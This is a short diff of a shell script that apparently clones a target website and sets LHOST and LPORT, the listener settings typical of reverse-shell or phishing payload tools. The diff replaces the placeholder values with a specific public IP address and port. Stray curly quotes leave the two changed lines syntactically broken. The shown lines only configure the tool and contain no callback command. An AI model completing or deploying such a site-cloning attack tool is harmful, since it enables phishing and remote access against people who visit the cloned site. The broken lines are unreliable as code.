@@ -4,8 +4,8 @@
 read -p "Enter the URL of the website you want to clone: " TARGET_URL
 
 # Set LHOST and LPORT
-LHOST="YOUR_IP_ADDRESS"
-LPORT="YOUR_LISTENING_PORT"’
+LHOST="3.67.161.133"
+LPORT="12219"’
 
 # Clone the website
 echo "Cloning the website..."
